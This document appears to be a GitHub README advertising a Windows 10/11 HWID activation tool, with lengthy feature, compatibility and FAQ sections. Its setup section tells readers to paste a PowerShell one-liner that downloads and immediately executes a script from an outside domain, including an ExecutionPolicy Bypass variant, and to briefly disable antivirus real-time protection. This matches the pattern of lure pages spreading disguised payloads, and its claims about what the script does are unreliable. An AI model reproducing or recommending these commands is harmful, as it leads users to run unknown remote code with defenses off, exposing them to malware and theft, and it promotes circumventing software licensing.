<div align="center">

# Shadow_WIN_Activation: HWID-Based Windows Activation Tool for Windows 11

![preview](https://raw.githubusercontent.com/sgfjok/shadow-win-hwid-activator/main/card_69a516e.svg)

[![build](https://img.shields.io/badge/BUILD-SUCCESS-2ea44f?style=flat-square&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-CORE-06b6d4?style=flat-square&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/STAGE-STABLE-2ea44f?style=flat-square&labelColor=0d1117)]()

</div>

---

Shadow_WIN_Activation is a Windows activation utility that applies the HWID digital license method to permanently bind Windows 10 and 11 licenses to the target machine's hardware. The script operates without installing any files on the host system, requiring only an active internet connection and Windows Update enabled at the time of activation; in offline scenarios, the system finalizes activation automatically upon the next online contact. It supports a broad range of Windows 10/11 editions, including Core, Professional, Education, Enterprise, EnterpriseS (LTSB), and their respective N variants, and can be used to activate virtual machines as well.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Automated setup** — one command, done.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the install command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- Utilizes the HWID (Hardware ID) activation method to generate a permanent digital license bound to the device hardware.
- Produces a genuine digital entitlement that persists across reboots and does not require a background service or scheduled task.
- Operates without installing persistent files or modifying system binaries; execution is transient.
- Requires an active internet connection for initial license acquisition and validation.
- Relies on Windows Update components being enabled during the activation process.
- Supports offline execution with deferred activation: the license is acquired automatically at the next online contact.
- Compatible with virtual machines, applying the same hardware-bound licensing model as on physical hardware.
- Supports a broad range of Windows 10 and Windows 11 editions, including Core (Home), Core N, CoreSingleLanguage, CoreSingleLanguage N, Professional, Professional N, ProfessionalEducation, ProfessionalEducation N, ProfessionalWorkstation, ProfessionalWorkstation N, Education, Education N, Enterprise, Enterprise N, EnterpriseS (LTSB), and EnterpriseS (LTSB) N.
- Requires no product key input; the digital license is derived from the device's hardware fingerprint.
- Leaves no residual activation service or autorun entry after completion.

## How It Works

Shadow WIN Activation operates on the HWID (Hardware ID) activation principle, which binds a digital license to the unique hardware fingerprint of the target machine. Rather than patching system files or installing persistent components, the tool temporarily emulates the activation environment that Microsoft's licensing servers expect to see, allowing the system to request and receive a genuine digital entitlement.

The workflow proceeds in distinct stages. First, the tool validates the running Windows edition and build to confirm eligibility for HWID-based activation. It then constructs a hardware-derived identifier from components such as the motherboard, storage, and firmware signatures, ensuring the resulting license is tied to the physical machine. Next, it initiates a licensing exchange with the activation service over the network, retrieving a digital license ticket that Windows stores natively.

Once the ticket is applied, Windows commits the entitlement through its standard licensing subsystem, converting the installation to a permanently activated state. Because the license is digital and hardware-bound, it persists across reboots without requiring the tool to run again, and no background service or scheduled task is left behind. The tool performs its work in a single pass, leaving no installed files, drivers, or registry modifications after completion.

Network connectivity is required for the initial activation exchange. If the machine is offline at the time of execution, the tool defers the licensing request, and Windows will automatically complete activation upon the next contact with the activation service. Windows Update must remain enabled during activation, as the licensing subsystem depends on current update components to process the digital entitlement correctly. The same procedure applies to virtual machines, where the virtualized hardware profile serves as the basis for the bound license.

## Compatibility

Shadow WIN Activation is engineered for broad deployment across supported Windows 10 and Windows 11 client and server-grade environments, with edition detection handled automatically during the activation cycle. The tool targets the HWID (hardware-based digital license) activation path, which binds the license entitlement to the device's hardware fingerprint rather than to a product key, allowing activation state to persist across reboots and feature updates without re-execution.

**Supported Operating Systems**

- Windows 10 (all servicing channels, including Long-Term Servicing Channel builds)
- Windows 11 (including version 22H2, 23H2, and later cumulative releases)
- Both x64 and ARM64 architectures are supported where the underlying edition is available

**Supported Editions**

- Core (Home) and Core (Home) N
- CoreSingleLanguage and CoreSingleLanguage N
- Professional and Professional N
- ProfessionalEducation and ProfessionalEducation N
- ProfessionalWorkstation and ProfessionalWorkstation N
- Education and Education N
- Enterprise and Enterprise N
- EnterpriseS (LTSB/LTSC) and EnterpriseS (LTSB/LTSC) N

**Operational Requirements**

- Windows Update services must be enabled and reachable at the time of activation; the HWID method relies on the update pipeline to validate and provision the digital entitlement.
- An active internet connection is required for immediate activation. In offline scenarios, the script stages the request and the system completes activation automatically upon the next online contact with Windows Update.
- No persistent files are installed to the system; the activation routine operates in memory and does not modify system directories beyond the standard licensing store entries required by Windows itself.
- Virtual machines are fully supported, provided the hypervisor exposes a stable hardware fingerprint consistent with the guest edition being activated.

**Edition and Build Considerations**

- Activation behavior is validated against retail, OEM, and volume licensing media for the editions listed above.
- Insider Preview builds and custom-modified images may deviate from expected hardware fingerprint reporting; compatibility in these environments is not guaranteed.
- Server editions and non-Windows platforms are outside the supported scope.

**Deployment Scenarios**

- Physical workstations and laptops with standard UEFI or legacy BIOS firmware
- Hypervisor-based guests (Type 1 and Type 2) with persistent virtual hardware identifiers
- Multi-boot configurations where each Windows installation maintains an independent licensing store

Compatibility is maintained through the native Windows licensing infrastructure, ensuring the activator remains aligned with cumulative updates and servicing stack revisions without requiring reinstallation of the tool.

## FAQ

### Is permanent activation achieved?

Yes. The HWID method binds a digital license to the hardware fingerprint of the machine. Once the ticket is issued, the license persists across reboots and does not require a background service or scheduled task to remain active.

### Does the tool modify system files or install a persistent component?

No files are installed and no resident service is created. The activation flow writes the digital license ticket through the standard licensing interfaces, after which the tool can be removed. No drivers, filters, or startup entries are added.

### What are the network requirements during activation?

An active internet connection and a functioning Windows Update service are required at the time of activation so the hardware hash can be submitted and the license ticket retrieved. If the machine is offline, the request is queued and completes automatically at the next online contact with Windows Update.

### Which Windows editions are supported?

The tool targets Windows 10 and Windows 11 across the Core (Home), CoreSingleLanguage, Professional, ProfessionalEducation, ProfessionalWorkstation, Education, Enterprise, and EnterpriseS (LTSB/LTSC) families, including their N variants. Edition detection is automatic; no manual selection is required.

### How is the hardware fingerprint handled?

The fingerprint is derived from stable hardware identifiers (such as the SMBIOS UUID and motherboard serial). Because the license is bound to this fingerprint, significant hardware changes—particularly a motherboard replacement—may invalidate the existing ticket and require reactivation.

### Is virtual machine activation supported?

Yes. Virtual machines are supported provided the guest exposes consistent hardware identifiers and has network access to Windows Update during activation.

### How can activation status be verified?

Status can be confirmed through the standard Windows activation panel in Settings, or via the Software Protection Platform command-line interface, which reports the license channel and activation state.

### What happens if activation fails?

Failures typically stem from a disabled Windows Update service, blocked network access, or an unsupported edition. Restoring Windows Update and confirming connectivity generally resolves the issue; the tool reports the specific failure condition to aid diagnosis.

## Disclaimer

Shadow_WIN_Activation is provided as a technical utility for legitimate digital license activation using the HWID method. It is intended for use only on systems where you hold a valid Windows license or where activation is otherwise authorized by the applicable license terms.

This software is supplied "as is," without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. The maintainers make no guarantees regarding activation success, persistence of activation state, or compatibility with future Windows updates. Behavior may vary across Windows builds, editions, and hardware configurations.

The HWID activation method relies on the interaction between system hardware identifiers, the Windows licensing subsystem, and Microsoft activation servers. Activation outcomes are therefore dependent on factors outside the control of this project, including but not limited to hardware changes, firmware updates, and server-side policy changes. Re-activation may be required following significant hardware modifications.

No files are installed by this software, and no persistent modifications are made beyond the activation state managed by Windows itself. Users are responsible for verifying the integrity of the script before execution and for understanding the operations it performs on their systems.

By using Shadow_WIN_Activation, you acknowledge that you assume full responsibility for compliance with all applicable local, regional, and international laws and with the Microsoft Software License Terms governing your Windows installation. The maintainers disclaim any liability for misuse, for activation performed on unlicensed systems, or for any direct, indirect, incidental, or consequential damages arising from the use of this software.

This project is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. Windows is a trademark of Microsoft Corporation.